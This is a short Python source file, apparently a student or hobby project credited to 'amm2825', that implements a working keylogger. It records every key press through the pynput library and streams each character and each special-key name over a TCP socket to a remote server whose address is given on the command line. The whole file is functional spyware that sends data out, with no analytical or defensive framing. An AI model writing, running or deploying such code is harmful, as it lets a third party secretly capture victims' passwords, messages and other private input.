#!/usr/bin/env python3
"""
keylogger_client.py
Author: amm2825
Description: A simple Python keylogger that sends captured keystrokes to a remote listener.
"""

import socket
import sys
from pynput import keyboard

def main(server_ip, server_port):
    # Connect to remote server
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((server_ip, int(server_port)))
        print(f"[+] Connected to {server_ip}:{server_port}")
    except Exception as e:
        print(f"[-] Could not connect to server: {e}")
        sys.exit(1)

    def on_press(key):
        """Callback for key press events."""
        try:
            # Key has a .char for normal keys
            # but special keys raise AttributeError
            s.sendall(key.char.encode('utf-8'))
        except AttributeError:
            # If it's a special key, send the key name
            s.sendall(f"[{key}]".encode('utf-8'))

    # Start listening to keystrokes
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

    # If the listener ends, close the socket
    s.close()

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <server_ip> <server_port>")
        sys.exit(0)
    server_ip = sys.argv[1]
    server_port = sys.argv[2]
    main(server_ip, server_port)
